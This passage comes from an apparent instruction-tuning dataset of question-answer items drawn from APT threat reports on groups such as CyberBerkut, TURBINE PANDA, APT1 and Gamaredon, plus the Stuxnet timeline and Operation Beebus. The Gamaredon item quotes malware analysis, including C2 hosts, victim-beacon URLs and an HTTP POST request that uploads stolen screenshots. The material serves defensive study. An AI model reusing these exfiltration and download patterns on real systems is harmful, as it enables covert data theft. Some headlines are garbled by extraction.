    "output": "Hacktivist groups in Ukraine, such as CyberBerkut, have conducted actions that raise questions about possible coordination with state entities. For instance, when CyberBerkut briefly compromised Ukraine's online election system to display fake election results, a Russian state-owned TV channel immediately broadcast these results. This suggests potential coordination between the hacktivist group and Russian state media. Additionally, CyberBerkut allegedly leaked a recording of a phone call between Estonian Minister of Foreign Affairs Urmas Paet and EU High Representative Catherine Ashton, indicating that the group either possesses sophisticated cyber capabilities or has links to Russian intelligence services.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: FORWARD\nRarely in the infosec industry do cyber investigators get the luxury of knowing the full scope of their adversary's campaign\u2014from tasking, to actual operations, all the way to completion. The oft-repeated mantra \"Attribution is hard\" largely stands true. Short of kicking down the door just as a cyber actor pushes enter, it is frustratingly hard to prove who is responsible for cyber attacks with 100% certainty. However, a series of recent U.S. Department of Justice (DoJ) indictments released over the course of two years, combined with CrowdStrike Intelligence's own research, has allowed for startling visibility into a facet of China's shadowy intelligence apparatus.\nIn this blog, we take a look at how Beijing used a mixture of cyber actors sourced from China's underground hacking scene, Ministry of State Security (MSS/\u56fd\u5b89\u90e8) officers, company insiders, and state directives to fill key technology and intelligence gaps in a bid to bolster dual-use turbine engines which could be used for both energy generation and to enable its narrow-body twinjet airliner, the C919, to compete against western aerospace firms. What follows is a remarkable tale of traditional espionage, cyber intrusions, and cover-ups, all of which overlap with activity CrowdStrike Intelligence has previously attributed to the China-based adversary TURBINE PANDA. These operations are ultimately traceable back to the MSS Jiangsu Bureau, the likely perpetrators of the infamous 2015 U.S. Office of Personnel Management (OPM) breach.\nSource: https://www.flightglobal.com/news/articles/cfm-delivers-first-leap-1c-to-comac-414924/\n\nHow did the Chinese government leverage various resources, including cyber actors and state directives, to advance their dual-use turbine engine technology, and what role did TURBINE PANDA play in these operations?",
    "output": "The Chinese government utilized a combination of cyber actors from China's underground hacking scene, Ministry of State Security (MSS) officers, company insiders, and state directives to acquire key technology and intelligence. This effort aimed to enhance dual-use turbine engines, which could be employed for both energy generation and to support the development of the C919 narrow-body twinjet airliner, enabling competition with Western aerospace firms. The operations involved traditional espionage, cyber intrusions, and cover-ups, which were linked to activities previously attributed to the China-based adversary TURBINE PANDA. These actions were ultimately traced back to the MSS Jiangsu Bureau, the suspected perpetrators of the 2015 U.S. Office of Personnel Management (OPM) breach.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2.2 Stuxnet Timeline\nVirusBlokAda reportedly detected Stuxnet components as Trojan-Spy.0485 and MalwareCryptor.Win32.Inject.gen on 17th June 2010 (), and also described the .LNK vulnerability on which most of the subsequent attention was focused. However, it seems that Microsoft, like most of the security industry, only became aware (or publicly acknowledged) the problem in July. (See: )\nRealtek Semiconductor were notified of the theft of their digital signature keys on 24th June 2010. ().\nESET was already detecting some components of the attack generically early in July 2010, but the magnitude of the problem only started to become obvious later that month. Siemens don't seem to have been notified (or at any rate acknowledged receipt of notification) until 14th July 2010. . On the same day, another driver was compiled as subsequently revealed by ESET analysis and reported on 19th July:\nOn the 15th July, Brian Krebs was, as usual, ahead of the pack at in pointing out that there was a control systems issue. Advisories were posted by US-CERT and ICS-CERT (; .)\nA Microsoft advisory was posted on 16th July (), supplemented by a Technet blog (). The Internet Storm Center also commented: . See also MITRE Common Vulnerabilities and Exposures (CVE) #CVE-2010-2568\nMicrosoft Security Advisory #2286198 Workaround: ; ; ;\nOn the 17th July, the Verisign certificate assigned to Realtek Semiconductor was revoked (http://). However, the second driver, now using a JMicron certificate was identified: . The first of a comprehensive series of ESET blogs was posted.\nTable 2.2.1 \u2013 Stuxnet-Related Blogs by ESET\nOn the 19th SANS posted an advisory regarding the .LNK vulnerability (), and on the 19th and 20th July Siemens updated its posts:\nESET labs were now seeing low-grade Autorun worms, written in Visual Basic, experimenting with the .LNK vulnerability, and had added generic detection of the exploit (LNK/Exploit.CVE-2010-2568). Most AV companies had Stuxnet-specific detection by now, of course. Some of the malware using the same vulnerability that appeared around that time was described by David Harley in a Virus Bulletin article, \"Chim Chymine: a Lucky Sweep?\" published in September 2010.\nThe Internet Storm Center raised its Infocon level to yellow in order to raise awareness of the issue (). (<http://news.softpedia.com/news/PoC-Exploit-Code-Available-for-Windows-LNK-Vulnerability-148140.shtml>)Softpedia and (<http://www.computerworld.com/s/article/9179339/Windows_shortcut_attack_code_goes_public?taxonomyId=17&pageNumber=1>)Computerworld, among others, noted the publication of exploit code using the .LNK vulnerability.\nWired magazine reported that it was well-known that some Siemens products made use of hard-coded passwords, as described above:\nSiemens has made quite a few advisories available, but has not really addressed the hard-coded password issue directly, and some pages appear to have been withdrawn at the time of writing. The following pages were still available:\nA number of new malware families were identified using same vulnerability in late July, and a number of other families such as Win32/Sality generated new variants that also used it.\nWin32/TrojanDownloader.Chymine.A downloads Win32/Spy.Agent.NSO keylogger; Win32/Autorun.VB.RP, and is similar to malware described by ISC on 21st July (), but updated to include the CVE-2010-2568 exploit for propagation.\nPierre-Marc Bureau and David Harley blogged on the subject at , and Harley explored the issues further in (<http://securityweek.com/shortcuts-insecurity-lnk-exploits>)\"Shortcuts to Insecurity: .LNK (<http://securityweek.com/shortcuts-insecurity-lnk-exploits>)Exploits\" at , and \"Chim Chymine: a lucky sweep?\" in the September issue of Virus Bulletin.\nAryeh Goretsky's blog at comments on the Microsoft patch which finally appeared at the beginning of August: see .\nFurther Microsoft issues were addressed in September, as described in this document. See also .\nMicrosoft released a security update to address the Print Spooler Service vulnerability used by Stuxnet. The vulnerability only exists where a printer is shared, which is not a default.\n.\nFurther fixes promised for two Elevation of Privilege vulnerabilities.\nRalph Langner's analysis of how Stuxnet affects a vulnerable installation was further discussed at the ACS conference in September 2010, but AV industry analysis did not fully concur.\nRelated last-minute presentations at Virus Bulletin 2010:\nMuch of the earlier controversy about the origin and targeting of Stuxnet derived from uncertainty about exactly what its code was meant to do. Even after it was established that it was intended to modify PLC (Programmable Logic Controller) code, details of the kind of installation targeted remained unclear.\nHowever, research into this aspect of the Stuxnet code by Symantec et al, blogged by Eric Chien at http://www.symantec.com/connect/blogs/stuxnet-breakthrough, told us that \"Stuxnet requires the industrial control system to have frequency converter drives from at least one of two specific vendors, one headquartered in Finland and the other in Tehran, Iran. This is in addition to the previous requirements we discussed of a S7-300 CPU and a CP-342-5 Profibus communications module.\" He goes on to describe in some detail the workings of the relevant Stuxnet code. Symantec's hefty (<http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf>)Stuxnet (<http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf>)dossier was updated accordingly.\nThis didn't put a complete end to the speculation, of course. In fact, some of the speculation actually grew wilder. Most notably, Sky News, tired of mere factual reporting and even half-informed speculation, (<http://news.sky.com/skynews/Home/video/Stuxnet-Worm-Virus-Targeted-At-Irans-Nuclear-Plant-Is-In-Hands-Of-Bad-Guys-Sky-News-Sources-Say/Video/201011415828645>)took off for planet Fantasy, where it discovered that the Sky really is falling, claiming that the \"super virus\" is being traded on the black market and \"could be used by terrorists\". That, we suppose, would be the bad guys as opposed to the saintly individuals who originally put Stuxnet together, very possibly to attack nuclear facilities.\nOur view is that, given the amount of detailed analysis that's already available, anyone with malicious intent and a smidgen of technical skill would not need the original code.\nThere is certainly substantial evidence suggesting that equipment used for uranium enrichment in nuclear facilities, perhaps in Iran, was the original target. However, Will Gilpin, apparently an IT security consultant to the UK government, suggested that possession of \"the virus\" in whatever form has alarming potential:\n\"You could shut down the police 999 system.\n\"You could shut down hospital systems and equipment.\"\n\"You could shut down power stations, you could shut down the transport network across the United Kingdom.\"\nThese assertions clearly owed little to the PLC code actually discussed in the competent analyses above. While it might be possible to do all these things, that would require extensive re-engineering of the existing code and possibly a completely new set of 0-days.\nWhile it's by no means all-inclusive, the timeline at is pretty comprehensive.\nThe Langner team at finished the year 2010 with a blog summarizing the \"up-to-date bottom line\" on their view of Stuxnet. Of course, they had published a steady stream of interesting and relevant blogs at before that, some of which have been listed in this document.\nAs of version 1.31 of this document, we will not be publishing further revisions except to correct errors or to introduce substantial new or modified material. We will, however, be adding links from time to time to the ESET blog entry at .\n\nQ: What were the key milestones in the timeline of Stuxnet's detection and response, and how did the security community adapt to the evolving threat?",
    "output": "A: Key milestones in the timeline of Stuxnet's detection and response included the initial identification by VirusBlokAda in June 2010, followed by broader recognition in July. Notifications to Realtek and Siemens, advisories from US-CERT and ICS-CERT, and Microsoft's security advisory marked significant steps in the response. The revocation of the Realtek certificate and the identification of a second driver using a JMicron certificate were crucial developments. The security community adapted by enhancing detection mechanisms, analyzing the malware's code, and sharing findings through blogs and advisories. ESET, Symantec, and other firms played pivotal roles in providing comprehensive analyses and updates, contributing to a deeper understanding of Stuxnet's capabilities and targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Final Word\nThe implants identified have limited, generic, and often conflicting detections on VirusTotal. The threat group using these implants has been active since at least 2014 and has been seen targeting individuals likely involved in the Ukrainian government. Some of the samples share delivery mechanisms and infrastructure with samples which are detected by a few antivirus vendors as Gamaredon. However, newer variants deliver more advanced malware which goes unnamed.\nPeriodically, researchers at Palo Alto Networks hunt through WildFire execution reports, using AutoFocus, to identify untagged samples' artifacts in the hopes of identifying previously undiscovered malware families, behaviors, and campaigns.\nThis blog presents a threat group identified by the above process using AutoFocus. By actively hunting for malicious activity and files instead of waiting for alerts to triage, defenders can identify and building protections for new trends before they arrive on their corporate networks and endpoints. More details about this threat group can be found in the AutoFocus tag (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.GamaredonGroup>)GamaredonGroup.\nPalo Alto Networks customers are protected from this threat in the following ways:\nWildFire identifies the malware described in this report as malicious.\nTraps prevents execution of the malware described in this report.\nThe C2 domains used by this group are blocked through Threat Prevention.\nSpecial thanks go out to Tom Lancaster for both his assistance in this investigation and for his charming good looks.\nMedium Headline: USBStealer: MSO5678.usb / OfficeUpdate.dll\nThis file is a USB file stealer which can be also guessed by its internal name \"USBgrabber.dll\". However, the implementation is sloppy which makes it a file stealer for any newly connected logical volume on a system. This is because the malware monitors the computer for messages WM_COMMAND and WM_DEVICECHANGE, but not verifying if a USB drive was connected.\nThe malware creates two mutexes \"__Wsnusb73__\" and \"__Wsnusbtt73__\". Then, it creates the following folder in the temp path of the local user:\n\"C:\\Users\\<Username>\\AppData\\Local\\Temp\\reports\"\nThis folder is used as a temporary location to copy all files from a newly connected logical drive to and upload them to the C2 server. The files are transferred to the hardcoded C2 server \"195.62.52.93\" one by one via HTTP POST method. The following request is used which also includes information about the victim, the file to be transferred as well as the source drive:\nThe malware also creates a SQLite database named \"asha.dat\" in the local users temp folder. Therein, it keeps track of files which were stolen by calculating the MD5 hash of the filename followed by the file length. Therefore, it creates a Unicode string of the original file path from the drive and concatenates the file size in bytes to it. Finally, it uses the API functions MD5Init(), MD5Update() and MD5Final() to calculate the hash and store it in the database.\nIt should be noted, that only hashes of files are added to the database that don't have the following extensions:\nDLL\nBIN\nCAB\nEXE\nISO\nMedium Headline: Downloader: MSO1567.dls / LocalSMS.dll\nThis file is essentially a simple downloader which contacts the C2 server to send some user data and get an executable as response which will be executed. The DLL is written in C++ and contains all of the functionality is in an export function named \"EntryPoint\". The file was compiled without any compiler or linker optimizations, thus the big file size and the remaining PDB path string.\nAt first, the malware retrieves the temp path of the local user (\"C:\\Users\\<Username>\\AppData\\Local\\Temp\\\"), the computer name (e.g. \"WIN-MLABCSUOVJB\"), the hardware profile GUID (e.g. \"{826ee360-7139-11de-8d20-808e6f6e6263}\") and the volume serial number of C:\\ drive (e.g. \"1956047236\"). Next, it takes the following hardcoded string:\nhttp://adobe.update-service[.]net/index.php?comp=\nTo create a URL string with the victims information for contacting the C2 server:\nhttp://adobe.update-service[.]net/index.php?comp=WIN-MLABCSUOVJB&id=WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236\nTo create the filename where the downloaded file will be saved, the malware tries to build a random string of 10 characters. However, due to an implementation error the string always ends up being the same, namely \"frAQBc8Wsa\". This string gets concatenated with the retrieved local users temp path to the following file path:\nC:\\Users\\\\AppData\\Local\\Temp\\frAQBc8Wsa\nThen, it uses the API function URLDownloadToFileA() to download a payload to disk and executes it via CreateProcess(). Finally, it sleeps for 60 seconds before terminating the payload and the DLL exits.\nMedium Headline: Downloader: MSO8734.obn / MpClients.dll\nThis file is a slightly more advanced version of LocalSMS.dll downloader. Instead of downloading a payload directly to disk, this file requests a download command from the C2 server which contains the actual payload URL to be used. Therefore, it uses a basic network implementation based on the Winsock functions. All the functionality of this DLL is put into an export function named \"bitDefender\".\nIt creates a socket, requests the address of the hardcoded C2 server \"win-restore.ru\" via gethostbyname() and connects to it. Thereafter, it also collects the volume serial number of C:\\ drive, the computer name and the hardware profile GUID. With this information, it creates the following string used by a subsequent send() function call:\n\"GET /css.php?id=WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236 HTTP/1.1\nHost: win-restore.ru\nConnection: close\"\nThe response will be stored into a memory buffer via recv() and scanned for the string \"urltoload={\". As the name suggests, the received data contains the actual URL of the payload inside curly brackets. The URL gets pulled out of the string and is used again as input for the API function URLDownloadToFile(). Again, the same file path will be used to store the payload on disk and execute it:\n\"C:\\Users\\<Username>\\AppData\\Local\\Temp\\frAQBc8Wsa\"\nMedium Headline: Pteranodon: MSO1234.win / winrestore.dll\nPteranodon is a backdoor which also can capture screenshots based on a configuration file created on the disk. Further, it uploads the screenshots to the C2 server unencrypted. All the functionality of this DLL is put into an export function named \"updater\".\nAt first, it retrieves the %APPDATA% folder of the local user to build the following file path:\n\"C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\desktop.ini\"\nThen, it checks if the file already exists and continues execution if so. If not, it runs a routine which checks if there is mouse movement as an anti-sandbox technique. If no mouse movement is detected the malware runs in an infinite loop checking for mouse movement.\nIf the file \"desktop.ini\" does not exist, the malware creates it and writes the following information into it:\n\" interval={60} msfolder={10} status={0}\"\nThis information is used as configuration data to create the screenshots. There are also other commands possible which can be retrieved from the C2 server. The following commands are available:\nSmall Headline: status={\nThis command contains the flag which defines if screenshots should be made (\"1\") or not (\"0\").\nNext, it checks for a mutex named \"asassin1dj\" to verify if the system is already infected and creates it if this isn't the case:\nNext, it creates the following folder, if not already present:\n\"C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store\"\nNext, according to the configuration data in \"desktop.ini\" it constantly creates 24-bit color depth JPEG screenshots without extension in the store folder with help of GDI32 and gdiplus API functions. The following file naming scheme for the screenshots is used:\n<year><month><day>_<hour><minute><seconds>\nAfter the last screenshot was created, it uploads all files from the \"store\" folder to the C2 server \"win-restore[.]ru\". Then, it deletes all the files present in the folder and starts a new screenshot creation cycle. It should be noted that there is no check of what files are uploaded. The files are uploaded via POST HTTP method to the script \"vvd.php\". For this, the following HTTP request is used which contains also data from the victim as well the JPEG files:\n1 POST /vvd.php HTTP/1.1\n2 Accept: application/x-www-form-urlencoded\n3 Connection: Keep-Alive\n4 Content-Type: multipart/form-data; boundary=----------987978B0urd3Gf_$\n5 Accept-Charset: utf-8\n6 User-Agent: asasing\n7 Host: win-restore.ru\n8 Content-Length: <length>\n9 Cache-Control: no-cache\n10 11 ------------987978B0urd3Gf_$\n12 Content-Type: text/html\n13 Content-Disposition: form-data; name=\"uuid\" 14\n15 WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236\n16 ------------987978B0urd3Gf_$\n17 Content-Type: application/octet-stream\n18 Content-Disposition: form-data; name=\"file0\"; filename=\"_\"\n19 Content-Transfer-Encoding: 8bit 20 ...JPEG file...\n21 ------------987978B0urd3Gf_$\n22 Content-Type: application/octet-stream\n23 Content-Disposition: form-data; name=\"file1\"; filename=\"_\"\n24 Content-Transfer-Encoding: 8bit\n25 ...JPEG file... 26 ...\n27 ------------987978B0urd3Gf_$\nFinally, it checks if any new command information is available from the C2 server and updates the \"desktop.ini\" file according to it. Based on functionality, compile timestamps, and binary differencing this malware is likely an updated version of 598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824.\n\nQ: What are the differences between the 'LocalSMS.dll' and 'MpClients.dll' downloader malwares used by the Gamaredon Group?",
    "output": "A: 'MpClients.dll' is a more advanced version of 'LocalSMS.dll'. Instead of downloading a payload directly to disk, 'MpClients.dll' requests a download command from the C2 server which contains the actual payload URL. It uses Winsock functions to create a socket and communicate with the C2 server. The malware collects the volume serial number, computer name, and hardware profile GUID to create a request string. The response from the C2 server includes the payload URL, which is then downloaded and executed similarly to 'LocalSMS.dll'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: PLa unit 61398 and state-owned enterprise China telecom are Co-building Computer network operations Infrastructure\nMandiant found an internal China Telecom document online that provides details about the infrastructure provided to Unit 61398. The memo (in (<>)Figure 8) reveals China Telecom executives deciding to \"co-build\" with Unit 61398 to justify the use of their own inventory in the construction of fiber optic communication lines \"based on the principle that national defense construction is important.\" The letter also appears to indicate that this is a special consideration being made outside of China Telecom's \"normal renting method\" for Unit 61398. Additionally, the memo clarifies the phrase \"Unit 61398\" with the comment \"(GSD 3rd Department, 2nd Bureau).\" The memo not only supports the identity of Unit 61398 as GSD's 3rd Department 2nd Bureau, but also reveals the relationship between a \"very important communication and control department\" (Unit 61398) and a state-influenced enterprise.\n22 Confirmation of several other Unit 61398 support facilities along Datong Road: Address: \u4e0a\u6d77\u5e02\u6d66\u4e1c\u65b0\u533a\u5927\u540c\u8def50\u53f7 (Pudong New Area, Shanghai, Datong Road 50) Building Name: \u4e2d\u56fd\u4eba\u6c11\u89e3\u653e\u519b\u7b2c61398\u90e8\u961f\u53f8\u4ee4\u90e8 (People's Liberation Army Unit 61398 Headquarters) Source: Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6 %B0%91%E8%A7%A3%E6%94%BE%E5%86%9B% E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%BB%A4%E9%83%A8, accessed February 6, 2013. Address: \u4e0a\u6d77\u5e02\u6d66\u4e1c\u65b0\u533a\u5927\u540c\u8def118\u5f04\u7532 (Pudong New Area, Shanghai, Datong Road 118 A) Building Name: \u4e2d\u56fd\u4eba\u6c11\u89e3\u653e\u519b\u7b2c61398\u90e8\u961f\u53f8\u4ee4\u90e8 (People's Liberation Army Unit 61398 Headquarters) Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0% 91%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%BB%A4%E9%83%A8_0, accessed February 6, 2013. Address: \u4e0a\u6d77\u5e02\u6d66\u4e1c\u65b0\u533a\u9ad8\u6865\u9547\u5927\u540c\u8def135\u53f7 (Pudong New Area, Shanghai Gaoqiao Town, Datong Road 135) Building Name: \u4e2d\u56fd\u4eba\u6c11\u89e3\u653e\u519b\u7b2c61398\u90e8\u961f (People's Liberation Army Unit 61398) Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9 1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F_0, accessed February 6, 2013. Address: \u4e0a\u6d77\u5e02\u6d66\u4e1c\u65b0\u533a\u9ad8\u6865\u9547\u5927\u540c\u8def153\u53f7 (Pudong New Area, Shanghai Gaoqiao Town, Datong Road 153) Building Name: \u4e2d\u56fd\u4eba\u6c11\u89e3\u653e\u519b\u7b2c61398\u90e8\u961f (People's Liberation Army Unit 61398) Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9 1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F, accessed February 6, 2013. Address: \u4e0a\u6d77\u5e02\u6d66\u4e1c\u65b0\u533a\u5927\u540c\u8def305\u53f7 (Pudong New Area, Shanghai, Datong Road 305) Building Name: \u4e2d\u56fd\u4eba\u6c11\u89e3\u653e\u519b\u7b2c61398\u90e8\u961f\u540e\u52e4\u90e8 (Logistics Department of the Chinese People's Liberation Army Unit 61,398)( Chinese phone book listing building name and address; http://114.mingluji.com/category/%E7%B1%BB%E5%9E%8B/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%91%E8%A7%A3%E6%94%BE%E5%86%9B?page=69, accessed February 6, 2013.\n23 Unit 61398 Kindergarden Listed in Shanghai Pudong: http://www.pudong-edu.sh.cn/Web/PD/jyzc_school.aspx?SiteID=45&UnitID=2388\n24 James C. Mulvenon and Andrew N. D. Yang, editors, The People's Liberation Army as Organization: Reference Volume v1.0, (Santa Monica, CA: RAND Corporation, 2002), 125, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed February 6, 2013.\nFIGure 8: China telecom Memo discussing unit 61398 source:  http://r9.he3.com.cn/%e8%a7%84%e5%88%92/%e9%81%93%e8%B7%aF%e5%8F%8a%e5%85%B6%e 4%BB%96%e8%a7%84%e5%88%92%e5%9B%Be%e7%Ba%B8/%e4%BF%a1%e6%81%aF%e5%9B%a D%e5%8C%Ba/%e5%85%B3%e4%Ba%8e%e6%80%BB%e5%8F%82%e4%B8%89%e9%83%a8%e4%B a%8C%e5%B1%80-%e4%B8%8a%e6%B5%B7005%e4%B8%aD%e5%BF%83%e9%9C%80%e4%BD%B-F%e7%94%a8%e6%88%91%e5%85%aC%e5%8F%B8%e9%80%9a%e4%BF%a1.pdf25\n25 This link has Chinese characters in it which are represented in URL encoding\nMarket Department Examining Control Affairs Division Report\nRequesting Concurrence Concerning the General Staff Department 3rd Department 2nd Bureau Request to Use Our Company's Communication Channel\nDivision Leader Wu:\nThe Chinese People's Liberation Army Unit 61398 (General Staff Department 3rd Department 2nd Bureau) wrote to us a few days ago saying that, in accordance with their central command \"8508\" on war strategy construction [or infrastructure] need, the General Staff Department 3rd Department 2nd Bureau (Gaoqiao Base) needs to communicate with Shanghai City 005 Center (Shanghai Intercommunication Network Control Center within East Gate Bureau) regarding intercommunication affairs. This bureau already placed fiber-optic cable at the East Gate front entrance [road pole]. They need to use two ports to enter our company's East Gate communication channel. The length is about 30m. At the same time, the second stage construction (in Gaoqiao Base) needs to enter into our company's Shanghai Nanhui Communication Park 005 Center (special-use bureau). This military fiber-optic cable has already been placed at the Shanghai Nanhui Communication Park entrance. They need to use 4 of our company ports inside the Nanhui Communication Park to enter. The length is 600m. Upon our division's negotiation with the 3rd Department 2nd Bureau's communication branch, the military has promised to pay at most 40,000 Yuan for each port. They also hope Shanghai Telecom will smoothly accomplish this task for the military based on the principle that national defense construction is important. After checking the above areas' channels, our company has a relatively abundant inventory to satisfy the military's request.\nThis is our suggestion: because this is concerning defense construction, and also the 3rd Department 2nd Bureau is a very important communication control department, we agree to provide the requested channels according to the military's suggested price. Because this is a one-time payment, and it is difficult to use the normal renting method, we suggest our company accept one-time payment using the reason of \"Military Co-Construction [with China Telecom] of Communication Channels\" and provide from our inventory. The military's co-building does not interfere with our proprietary rights. If something breaks, the military is responsible to repair it and pay for the expenses. After you agree with our suggestion, we will sign an agreement with the communication branch of 61398 and implement it.\nPlease provide a statement about whether the above suggestion is appropriate or not.\n[Handwritten Note]Agree with the Market Department Examining Control Affairs Division suggestion; inside the agreement clearly [...define? (illegible) ...] both party's responsibilities.\nFIGure 9: english translation of China telecom Memo\n\nQ: In what ways does the memo reveal the relationship between a state-influenced enterprise like China Telecom and a military unit like PLA Unit 61398, and what implications does this have for understanding the broader cyber espionage activities of APT1?",
    "output": "A: The memo reveals a close relationship between China Telecom, a state-influenced enterprise, and PLA Unit 61398, a military unit. This relationship involves the provision of critical infrastructure, such as fiber optic communication lines, to support the military's needs. The memo shows that China Telecom made special considerations for Unit 61398, indicating a prioritization of national defense over standard business practices. This collaboration suggests that state-influenced enterprises may play a significant role in supporting the cyber espionage activities of units like APT1, providing the necessary infrastructure and resources to conduct extensive and persistent cyber operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the APT group use Phishing: Spearphishing Link in their attack campaigns against Ukrainian government organizations?",
    "output": "Phishing: Spearphishing Link is a type of social engineering attack where adversaries send spearphishing emails with malicious links to gain access to victim systems. In the case of the APT group mentioned in the PaloAlto_Spear-Phishing-Ukraine-OutSteel report, they used Phishing: Spearphishing Link in their attack campaigns against Ukrainian government organizations. Specifically, in April 2021, the threat group carried out an attack that involved a spear phishing email with a PDF document attached, which suggested the recipient could become rich by accepting Bitcoins. The PDF document contained a link to download a Zip archive, which contained a LNK shortcut that ran a PowerShell script to download and execute a payload from a malicious URL. Similarly, in another attack, the group sent a fake forwarded message meant to appear as correspondence between a government official and the World Health Organization (WHO), which contained a link to a Zip archive hosted on a legitimate domain. However, the link pointed to a shortened link that ultimately led to a malicious URL. In both cases, the APT group used Phishing: Spearphishing Link to trick victims into clicking on malicious links, which would then download and execute malware on their systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: \ue023\ue0aa\ue08d\ue084\ue07c\ue0c6\ue093\ue0af\ue0aa\ue03b\ue060\ue084\ue07c\ue0c6\ue0af\ue0bc\nWe have seen this campaign use both email and drive\u00adby downloads as a means of infecting end users. The threat actor has consistently used attachment names of documents/white papers released by well\u00adknown companies. The malicious email attachment exploits some common vulnerabilities in PDF and DOC files.\nThe\nmalware uses a well\u00addocumented vulnerability in the Windows OS known as DLL search order hijacking. There is an order in which executables load DLLs on the Windows operating system. This particular malware takes advantage of this vulnerability and drops a DLL called ntshrui.DLL in the C:\\Windows directory. The first place from where the executable looks to load the DLL is its own directory. By dropping the ntshrui.DLL in the directory C:\\Windows, the malware achieves persistence.\nFigures 1 and 2 below show the modified weaponized PDF, which was used in the spear phishing attack. The PDF on the left is the non\u00admalicious version, while the one on the right is malicious. As you can see from the pictures below, the original PDF was modified using the Ghostscript tool. Also the size of the malicious PDF is significantly smaller than the non\u00admalicious version.\nThe malware communicates with a remote command and control (CnC) server. The GET request in Figure 4 is the initial request that the compromised machine makes to \"check in\" with the CnC server. The keyword \"p=2,\" which is sent out as part of the URI, appears to indicate the version of the malware. Mining our database we found three versions of this malware and they are noted in the table below. The version value is hard\u00adcoded in the ntshrui.DLL file in the samples we observed.\nIt encrypts information it collects with the base64 algorithm and then sends it to the remote CnC server as seen in Figure 4. It is interesting to note that the base64 data is subjected to some substitutions before it is sent out preventing run of the mill inspection on the wire. It replaces the '/' (forward slash) and '+' (plus) characters which are part of the base64 character set with '_' (underscore) and '\u00ad' (hyphen) respectively. The code that performs this operation is shown in Figure 5.\nA sample of the data that is encrypted and sent to the CnC server for version 'p=2' is seen in the memory dump shown in Figure 6. At offset 4\u00ad7 it contains a time\u00adbased counter. It uses the keyword \"osamu\" in this instance to identify this particular campaign. The campaign keywords are not sent out in version 'p=1' but can still be found hardcoded in the DLL payload. The hostname and OS information are also included in the beacon. It awaits further commands from the CnC server in response to the data sent out.\nIt has modules to capture system information (processor, disk, memory, OS), process id, process start time, and current user information. It also contains a module to download and execute additional payloads and updates. It downloads in to %TEMP% directory and calls CreateProcessA to invoke execution as seen below:\nThe POST request looks very similar to the GET request and uses base64 encoding to encode the URI.\nHTTP/1.1\nUser\u00adAgent: Mozilla/4.0 (compatible; )\nAccept: */*\nHost:\nContent\u00adLength: 563\nConnection: Keep\u00adAlive\nCache\u00adControl: no\u00adcache\nThe malware collects the following information from the compromised machine.\n1) Type of Processor\n2) CPU Speed\n3) Figures out the product type by querying the \\SYSTEM\\CurrentControlSet\\Control\\ProductOptions\\ProductType registry key.\n4) Memory Usage\nThe malware is fairly noisy sending multiple GET requests. In our test environment we observed that the POST request started a couple of hours after the malware initially checked in with the CnC. Around the same time we also noticed a new exe get dropped under \"C:\\Documents And Settings\\Administrator\\Local Setting\\Temp~ISUN32.exe\". The two figures below show the ISUN32.exe process start up and the exe get dropped under TEMP directory.\nWe4/10/2016have a full list which summarizes the attachment names, campaign codes, and campaign duration of this particular operation. The table also includes the md5sum of the malware payloads. Below is a subset of attachment names that we have observed. We are willing to share additional information with the security community. Please contact research at fireeye dot com for more information.\nsensor environments.doc\nGlobal_A&D_outlook_2012.pdf\nFY2013_Budget_Request .doc\nUnderstand your blood test report.pdf\nRHT_SalaryGuide_2012.pdf\nSecurity Predictions for 2012 and 2013.pdf\nApril Is the Cruelest Month.pdf\nNational Human Rights Action Plan of China (2012\u00ad2015).pdf\nDept of Defense FY12 A STTR Solicitation Topics of Interest to Boeing.pdf\nBoeing_Current_Market_Outlook_2011_to_2030.pdf\nRHT_SalaryGuide_2012.pdf\ndodd\u00adfrank\u00adconflict\u00adminerals.doc\nConflict\u00adMinerals\u00adOverview\u00adfor\u00adKPMG.doc\n\u0441\u043e\u043e\u0431\u0449\u0438\u0442\u044c.doc\nTimeline of the Beebus Campaign\nFrom the timeline below, we were able to figure out that this campaign has been targeting companies in the Aerospace and Defense vertical in waves. There is no specific pattern to this attack, we have seen days on which multiple weaponized emails were sent to several companies, and on other days we observed that the threat actor sent only one email to a specific target organization. The chart below shows Beebus attacks in the last year.\n\nAnswer this question based on the above context: How does the malware in Operation Beebus communicate with its command and control (CnC) server, and what kind of information does it send? Describe the encryption method used and any notable modifications to the encoded data.",
